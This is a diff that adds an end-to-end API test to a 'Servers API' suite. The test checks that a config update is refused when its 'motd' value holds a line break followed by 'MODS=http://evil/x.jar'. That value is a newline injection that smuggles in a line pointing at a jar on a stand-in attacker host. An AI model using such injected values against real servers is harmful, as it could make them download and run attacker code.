@@ -388,6 +388,16 @@ test.describe('Servers API', () => {
     });
   });
 
+  test.describe('PATCH /api/servers/:name/config - Update Config', () => {
+    test('should reject a config value with a line break (#726)', async ({ request }) => {
+      const response = await request.patch(`${API_BASE_URL}/api/servers/e2etest-config/config`, {
+        data: { motd: 'Hello\nMODS=http://evil/x.jar' },
+      });
+
+      expect(response.status()).toBe(400);
+    });
+  });
+
   test.describe('DELETE /api/servers/:name - Delete Server', () => {
     test('should return 404 for non-existent server', async ({ request }) => {
       const response = await request.delete(`${API_BASE_URL}/api/servers/non-existent-server-12345`);
